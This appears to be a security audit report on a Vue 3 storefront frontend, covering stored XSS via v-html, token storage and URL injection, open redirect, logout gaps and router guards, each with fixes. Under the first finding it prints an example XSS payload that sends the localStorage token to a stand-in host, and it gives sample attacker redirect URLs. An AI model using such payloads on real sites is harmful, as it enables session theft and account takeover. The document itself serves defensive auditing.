# Frontend SPA — Adversarial Security & Correctness Audit

Scope: Vue 3 SPA shell (`frontend/src`). Focus areas: XSS sinks, auth/token handling,
router guards, open redirect, client-side price/promo trust, localStorage of sensitive
data, axios/CSRF, prototype pollution, unsafe window APIs.

Method: every `v-html` and dangerous sink was traced to its data origin and checked for
sanitization. Guards were read against actual `beforeEach` logic. Token storage/transport
was traced end-to-end. **No sanitizer library (DOMPurify / sanitize-html / xss) is present
in `package.json`**, and `vue-i18n` is configured with `warnHtmlMessage: false`
(`src/i18n/index.js:24`), so no implicit sanitization exists for any `v-html`.

---

## Summary Table

| # | Severity | Category | Confidence | Location |
|---|----------|----------|-----------|----------|
| 1 | HIGH | Stored XSS (v-html, unsanitized server/admin HTML) | High | Multiple `v-html` sinks (articles, CMS pages, products, notifications, checkout rules, category text) |
| 2 | HIGH | Auth — token in localStorage + token injection via URL | High | `stores/auth.ts`, `components/auth/AuthCallback.vue:22-33` |
| 3 | MEDIUM | Open redirect via `?redirect=` | High | `components/auth/LoginPage.vue:168-169` |
| 4 | MEDIUM | Broken/insufficient logout — token survives in other persisted state & stale per-request headers | Medium | `stores/auth.ts:201-216`, cart/promo persistence |
| 5 | MEDIUM | Router guard does not block render of lazy `requiresAuth` chunk data; no RBAC; guest hydration failure path | Medium | `router.js:170-246` |
| 6 | MEDIUM | Sensitive PII persisted to localStorage (full user object incl. balance/discount) | High | `stores/auth.ts:8-33,82,124,228,283` |
| 7 | LOW | Cross-tab/`storage`-event trust + theme/lang unvalidated reads | Low | `composables/useTheme.ts`, `i18n/index.js` |
| 8 | LOW | `withCredentials=true` against a configurable cross-origin `baseURL` while also sending Bearer | Low | `bootstrap.js:12-18` |
| 9 | LOW | `useServiceLauncher` security theatre (anti-devtools/CSP injection) — false sense of protection | Medium | `composables/useServiceLauncher.ts` |
| 10 | INFO | Client-side discount/total math is display-only (server recomputes) — correctly NOT a boundary | High | `pages/CheckoutPage.vue` |

---

## BUG 1 — Stored XSS through unsanitized `v-html` on server/admin-controlled HTML

- **SEVERITY:** HIGH
- **Category:** Cross-Site Scripting (DOM injection via `v-html`)
- **Confidence:** High
- **Locations (all render raw HTML, no sanitizer in the stack):**
  - `src/pages/articles/ArticleDetails.vue:44` — `v-html="article.content"` (article body from `GET /articles/{id}` translations)
  - `src/pages/ContentPage.vue:10` — `v-html="pageStore.page[locale].content"` (CMS catch-all pages from `GET /pages`)
  - `src/pages/articles/ArticlesAll.vue:15` — `v-html="categoryTextHtml"` (category `translations[locale].text`, `ArticlesAll.vue:166-174`)
  - `src/components/products/ProductCard.vue:119` — `v-html="displayDescription"`; source `useProductTitle.getProductDescription` (`useProductTitle.ts:49-106`)
  - `src/pages/account/AccountDetail.vue:461` & `:493` — `v-html="description"` / `v-html="additionalDescription"` (same composable)
  - `src/components/layout/NotificationBell.vue:73` — `v-html="getTranslation(item, 'message')"` (notification message body from `GET /notifications`)
  - `src/pages/CheckoutPage.vue:415` — `v-html="currentRulesText"` (purchase-rules HTML from `GET /purchase-rules`)
  - `src/pages/BecomeSupplierPage.vue:11` — `v-html="content.welcomeBanner.headline"` (from `GET /site-content`)
  - `src/components/home/HeroSection.vue:9,13` — `v-html="heroTitle/heroDescription"` (siteContent hero)

- **Code path / why:** None of these values pass through a sanitizer. The only
  "sanitization" anywhere is `useProductTitle.getProductDescription`
  (`useProductTitle.ts:60-106`), which merely **adds** `rel`/`target` attributes to existing
  `<a>` tags and auto-links bare URLs via regex. It does **not** remove `<script>`,
  `<img onerror=...>`, `<svg onload=...>`, `<iframe>`, `javascript:` URIs, or event-handler
  attributes. For all the other sinks there is no processing at all. `vue-i18n` is set with
  `warnHtmlMessage:false`, and `package.json` has no DOMPurify/sanitize-html dependency.

- **Impact:** Any actor who can influence article content, CMS page content, product
  description, category text, a notification message, the purchase-rules text, or
  site-content (compromised/abusive admin, supplier with product-description rights, or any
  stored-content injection on the backend) gets script execution in every visitor's session.
  Because the auth token lives in `localStorage` (BUG 2/6), a single payload like
  `<img src=x onerror="fetch('//evil/?t='+localStorage.token)">` exfiltrates the bearer token
  and the full persisted user object — full account takeover. The notification sink is
  especially dangerous: it renders into the global header on every authenticated page and
  polls every 10s.

- **Suggested fix:** Add DOMPurify and sanitize every server/user HTML string before binding
  (e.g. a shared `v-safe-html` directive or `sanitize(html)` helper with a strict allowlist of
  tags/attributes; forbid `script`, event handlers, `javascript:`). Where rich HTML is not
  required (notifications, product short description, hero title), render as text. Combine with
  a real CSP that forbids inline script.

---

## BUG 2 — Auth token stored in `localStorage` and accepted from the URL without validation

- **SEVERITY:** HIGH
- **Category:** Insecure credential storage + token injection / session fixation
- **Confidence:** High
- **Location:** `src/stores/auth.ts:9-33,81-83,123-125,295-299`; `src/components/auth/AuthCallback.vue:22-33`
- **Code path / why:**
  - The bearer token is persisted to `localStorage['token']` and re-applied to
    `axios.defaults.headers.common['Authorization']`. `localStorage` is readable by any
    JavaScript in the origin, so it is directly exfiltratable by **any** of the XSS sinks in
    BUG 1. (HttpOnly cookies would not be.)
  - `AuthCallback.vue` reads `?token=` straight from `window.location.search` and calls
    `authStore.setToken(token)` + `fetchUser()` with **no validation of origin or token shape**.
    Any page can link a victim to `/auth/callback?token=<attacker_token>` and silently log the
    victim into the attacker's account (login CSRF / session fixation) — the victim then enters
    PII / makes purchases under the attacker's account, or the attacker later reads activity.
    There is also no `state`/nonce check tying the callback to a flow the user initiated.
- **Impact:** Token theft via XSS leads to full account takeover; token injection via the
  callback enables session-fixation phishing. The persisted token is also long-lived: it is
  rehydrated on every load (`auth.ts:33`, `init()`), so a stolen token works until the user
  explicitly logs out.
- **Suggested fix:** Prefer HttpOnly+Secure+SameSite cookies for the session (the backend is
  already `withCredentials`-based / Sanctum-style) and stop storing the raw token in
  `localStorage`. If a token must transit `/auth/callback`, validate a `state` nonce created
  before the redirect, validate token format, and immediately strip it from the URL with
  `history.replaceState`. Eliminating the localStorage token also defuses BUG 1's worst impact.

---

## BUG 3 — Open redirect via `?redirect=` on login

- **SEVERITY:** MEDIUM
- **Category:** Open redirect
- **Confidence:** High
- **Location:** `src/components/auth/LoginPage.vue:146,168-169` (and the guard that supplies it, `router.js:197-204`)
- **Code path / why:** After a successful login, `LoginPage` does
  `const redirectTo = route.query.redirect as string; await router.push(redirectTo || '/')`.
  The value is taken verbatim from the query string with no allowlist / same-origin check.
  Although the in-app guard only ever *generates* internal `to.fullPath` values, an attacker
  controls the URL directly: a crafted `/login?redirect=https://evil.example/phish` (or
  protocol-relative `//evil.example`) is a valid attacker-supplied link. Vue Router's
  `router.push` with a string path will route within the app for normal paths, but a
  `redirect` value such as `//evil.example` or a path that the server-side `history` fallback
  resolves can be abused for redirect-based phishing, and any future change to use
  `window.location` for the fallback (already present elsewhere, e.g. `MainMenu.vue:135`) makes
  it a full external redirect. The user-trust signal ("you are on the real login page, then it
  sends you onward") is the phishing value.
- **Impact:** Phishing / credential-harvest hand-off and OAuth-style redirect abuse; users
  trust the post-login redirect.
- **Suggested fix:** Validate `redirect` before use: accept only same-origin **relative** paths
  beginning with a single `/` and not `//` or `/\`, reject anything containing `:` or a host.
  Fall back to `/` otherwise.

---

## BUG 4 — Logout is incomplete: stale per-request headers and other persisted state retain identity

- **SEVERITY:** MEDIUM
- **Category:** Broken authentication / session teardown
- **Confidence:** Medium
- **Location:** `src/stores/auth.ts:201-216`; `src/stores/notifications.js` (reads `localStorage['token']` per request); `stores/productCart.ts` & `stores/promo.ts` persistence
- **Code path / why:**
  - `logout()` clears `token`/`user` from state and localStorage and deletes the axios default
    Authorization header. However, **token transport is inconsistent**: `auth` actions
    (`fetchUser`, `update`, `cancelSubscription`, `logout`) and **all** `notifications` actions
    read the token directly from `localStorage['token']` and attach an explicit per-request
    `Bearer` header (`notifications.js:18,65,99,137`). After logout the localStorage key is
    removed, so those reads now send `Bearer null`. That is not a leak by itself, but the dual
    code paths make it easy for any future caller relying on the default header to send requests
    with no auth or for a half-updated token to linger. The architecture doc itself flags this
    inconsistency.
  - Logout does **not** clear the persisted `product_cart` or `promo` Pinia state. On a shared
    machine, the next user sees the previous user's cart and applied promo code, and the promo
    store persists a validated discount result (`promo.ts:67`, `persist:true`) that is
    rehydrated and trusted for display (see BUG 10).
  - `UserMenu` logout (per architecture doc §4.6) resets notifications + cart, but the store
    `logout()` action itself does not — so any logout path that does not go through that
    component leaves residue.
- **Impact:** Cross-user data leakage on shared devices; brittle auth transport that can send
  malformed/empty credentials.
- **Suggested fix:** Centralize token transport on a single axios request interceptor; remove
  all ad-hoc `localStorage.getItem('token')` per-request headers. In `logout()` reset
  `productCart`, `promo`, and `notifications` stores and clear their persisted keys.

---

## BUG 5 — Navigation guard weaknesses: no RBAC, hydration-failure ordering, lazy data not gated

- **SEVERITY:** MEDIUM
- **Category:** Authorization / router guard
- **Confidence:** Medium
- **Location:** `src/router.js:170-246`
- **Code path / why:**
  - **No role-based access control.** Auth is binary (`requiresAuth`/`requiresGuest`). There is
    no `roles`/`meta` check anywhere. This is acceptable only if the SPA genuinely exposes no
    privileged (admin/supplier) views — confirm separately. Any view that assumes "logged in ⇒
    allowed" is trusting the client; the server must enforce per-resource authorization (the
    `requiresAuth` flag is a UX gate only, not a security boundary).
  - **`requiresAuth` is correct as a redirect** (`:197-204`) but note it relies on
    `authStore.isAuthenticated`, which is derived from `localStorage` user/token
    (`auth.ts:40-44`). A user can hand-edit `localStorage['user']` to inject
    `{email:'x', personal_discount:90, balance:999999, is_admin:true, ...}` and satisfy
    `isAuthenticated`; the guard then lets them into `requiresAuth` views and any component that
    reads `authStore.user.*` for display/logic will reflect the forged values until
    `fetchUser()` overwrites them. Because `fetchUser` is only awaited when `user` is null
    (`:187-194`), a forged-but-non-null user object is **not** re-validated on navigation.
  - **Guest checkout** intentionally drops `requiresAuth` on `/checkout` (`router.js:88-91`) —
    fine, but means the server must treat all `/checkout`-originated payment calls as untrusted.
- **Impact:** Reliance on client state for any gating; forged user object can unlock UI affordances
  and (if any endpoint trusts client-sent discount/role) escalate. Primary risk is wherever the
  server trusts a client claim.
- **Suggested fix:** Always `await fetchUser()` (or validate token) on entering `requiresAuth`
  routes rather than only when `user` is null; never trust persisted `user` fields for anything
  security-relevant; enforce all authorization server-side; if privileged views exist, add a
  real `meta.roles` check.

---

## BUG 6 — Full user object (PII, balance, discount) persisted to localStorage

- **SEVERITY:** MEDIUM
- **Category:** Sensitive data exposure / client-side trust
- **Confidence:** High
- **Location:** `src/stores/auth.ts:8-33, 82, 124, 228, 283`
- **Code path / why:** The entire `/user` response is JSON-stringified into
  `localStorage['user']` (email, balance, `personal_discount`,
  `personal_discount_expires_at`, `extension_settings`, etc.). This is (a) readable by any XSS
  (BUG 1), and (b) attacker-writable by the user themselves. `CheckoutPage.vue:517-539` reads
  `authStore.user.personal_discount` directly to compute the displayed discount; a user can set
  an arbitrary `personal_discount` in localStorage and see (and attempt to submit) inflated
  discounts. The submit only sends `{id, quantity, promocode}` and the server recomputes
  (good — see BUG 10), but the persisted PII exposure and the pattern of trusting
  `authStore.user.*` remain risks if any endpoint ever reads a client-claimed discount.
- **Impact:** PII leak via XSS; client can forge profile fields used in UI logic; balance and
  discount visible/forgeable in storage.
- **Suggested fix:** Persist the minimum needed (or nothing) to localStorage; re-fetch user from
  the server on load. Never derive a chargeable amount from `authStore.user` fields the client
  can edit — always let the server return the authoritative price/discount.

---

## BUG 7 — Unvalidated cross-tab `storage` and locale/theme reads

- **SEVERITY:** LOW
- **Category:** Client-side trust / minor injection surface
- **Confidence:** Low
- **Location:** `src/composables/useTheme.ts:26,39` (+ `storage` listener), `src/i18n/index.js:17-22`, `src/bootstrap.js:23`
- **Code path / why:** Theme is read from `localStorage['theme']` and applied to
  `documentElement.classList`; locale is read from `localStorage['user-language']` and sent as
  the `X-Locale` header on every request and used as a JSON-locale key. Values are not validated
  against an allowlist before the i18n locale is set / header is sent. This is low impact
  (`classList.toggle('dark', ...)` is boolean; `X-Locale` is a header value), but an arbitrary
  `user-language` becomes a request header and a locale key; restrict to `{en,uk,ru}`.
- **Impact:** Minor; header/locale pollution, no direct script execution.
- **Suggested fix:** Validate `user-language` against the supported set before use; ignore
  unexpected `theme` values.

---

## BUG 8 — `withCredentials=true` with a configurable cross-origin baseURL while also bearing a token

- **SEVERITY:** LOW
- **Category:** CSRF surface / credential transport
- **Confidence:** Low
- **Location:** `src/bootstrap.js:12-18`
- **Code path / why:** `axios.defaults.withCredentials = true` sends cookies on every request to
  `VITE_API_BASE`/`VITE_API_URL` (default `http://localhost:8000/api`), while auth also rides on
  a bearer header. If the deployed API origin differs from the SPA origin, cookies cross origin
  (requires permissive CORS `Access-Control-Allow-Credentials` + explicit origin server-side; if
  the server is misconfigured to reflect origin, this is exploitable). There is **no CSRF-token
  interceptor**; CSRF protection depends entirely on the backend (Sanctum cookie + SameSite).
  Sending both cookie and bearer doubles the surface and can mask which credential the server
  actually trusts. Verify the backend sets `SameSite=Lax/Strict` and a real CSRF token for
  state-changing cookie-authed requests.
- **Impact:** Potential CSRF on cookie-authenticated state-changing endpoints if backend CSRF
  is weak; credential confusion.
- **Suggested fix:** Pick one auth mechanism (cookie *or* bearer). If cookie, add Sanctum CSRF
  token handling and confirm `SameSite`. Pin the API origin and lock CORS to the exact SPA
  origin; do not reflect arbitrary origins.

---

## BUG 9 — `useServiceLauncher` anti-tamper injection gives a false sense of security

- **SEVERITY:** LOW
- **Category:** Security theatre / ineffective control
- **Confidence:** Medium
- **Location:** `src/composables/useServiceLauncher.ts:31-97`
- **Code path / why:** After `window.open(url, ...)` (with `noopener`/`noreferrer`), the code
  sets `newWindow.opener = null` and, on `load`, injects a CSP `<meta>`, a `referrer` meta, and
  a script that overrides `document.cookie`, polls a fake-devtools detector that navigates to
  `about:blank`, and blocks copy/contextmenu/F12. This only works for **same-origin** popups;
  for the actual external service URLs it is a no-op (cross-origin access throws and is
  swallowed at `:93-96`). It provides no real protection (devtools detection and copy-blocking
  are trivially bypassed) but may lead developers to believe purchased-account credentials shown
  in the popup are protected. The injected CSP also enables `'unsafe-inline' 'unsafe-eval'` and
  `connect-src *` — if ever applied same-origin it weakens rather than strengthens posture.
  Note: `launchService` is currently not called anywhere in `src/` (dead/forthcoming code), so
  live impact is nil today.
- **Impact:** None currently (uninvoked); risk is a misplaced trust assumption if used later.
- **Suggested fix:** Remove the anti-devtools/anti-copy theatre; rely on server-side controls
  for credential exposure. If a hardened popup is needed, do not inject a permissive CSP.

---

## BUG 10 — (INFO / ruled-out) Client-side discount & total math is display-only

- **SEVERITY:** INFO (correct design — documented to confirm it is NOT a boundary)
- **Category:** Client-side price trust
- **Confidence:** High
- **Location:** `src/pages/CheckoutPage.vue:512-569,745-887`; `stores/productCart.ts`; `stores/promo.ts`
- **Why it is acceptable:** All `subtotalPaid`/`personalDiscountAmount`/`promoDiscountAmount`/
  `finalTotal` computeds are used **only for rendering**. Every payment call
  (`/mono/create-payment`, `/cryptomus/create-payment`, `/cart`, and the guest variants) sends
  only `products:[{id, quantity}]` + optional `promocode` string — never a price, total, or
  discount. The server is responsible for pricing and promo validation. `promo.apply()` calls
  `POST /promocodes/validate` and the result is re-validated server-side at purchase. This is
  the right pattern. **Caveat:** the persisted `promo` store (`persist:true`) keeps a validated
  discount result across sessions/users on shared devices (see BUG 4) and `cart.price` is
  persisted client-side; ensure the server ignores any client-supplied price and re-prices by
  `id` at checkout (appears to be the case from the payloads). No price-trust bug found in the
  frontend payloads.

---

## Ruled out / checked-and-clean

- **`eval` / `new Function` / `document.write` / `innerHTML` / `insertAdjacentHTML`:** none
  present in `src/` (grep clean).
- **`SupportChatWidget.vue`:** message bodies render with `{{ message.message }}` (escaped),
  not `v-html` — no chat XSS. Telegram link opened via `window.open(telegramLink, '_blank')`
  where `telegramLink` is composed from config, not free user input.
- **i18n `$t(...)` v-html usages** (`ArticleSection.vue:5`, `MainPage.vue:47`,
  `CheckoutPage.vue:309`): render **static bundled locale strings**, not server/user data —
  not an injection vector (though `warnHtmlMessage:false` removes the guardrail if a translation
  ever interpolates user input).
- **`useServiceLauncher` opener leak:** `noopener` + `newWindow.opener=null` correctly prevent
  reverse-tabnabbing; the real issue is the theatre (BUG 9), not opener.
- **Prototype pollution:** `utils/localization.ts`, `useProductTitle.ts`, and store merges do
  **not** perform recursive deep-merge with attacker-controlled keys; no `__proto__`/
  `constructor` write sink found. `JSON.parse` results are only read by known keys. No
  vulnerable deep-merge utility in scope.
- **`productCart` redundant persistence** (Pinia plugin + manual `localStorage`): a correctness
  smell (double-write to `product_cart`), not a security bug.
- **Menu / banner external links** (`MainMenu.vue`, `FooterMenu.vue`, `MobileMenu.vue`,
  `useBanners.ts`, `HeroSection.vue`): open admin-configured `link` values via `window.open`/
  `location.href`. These are admin-controlled (option JSON / banner records), so they are an
  admin-trust surface, not anonymous-user injection. `MainMenu.vue:84` opens `_blank` **without**
  `noopener,noreferrer` (`MobileMenu.vue:84`, `FooterMenu.vue:28` likewise) — minor
  reverse-tabnabbing hardening gap; recommend adding `noopener,noreferrer` for consistency.
- **`BecomeSupplierPage.vue:585`** redirects to `optionStore.getOption('support_chat_telegram_link')`
  — admin-controlled config, not user input.
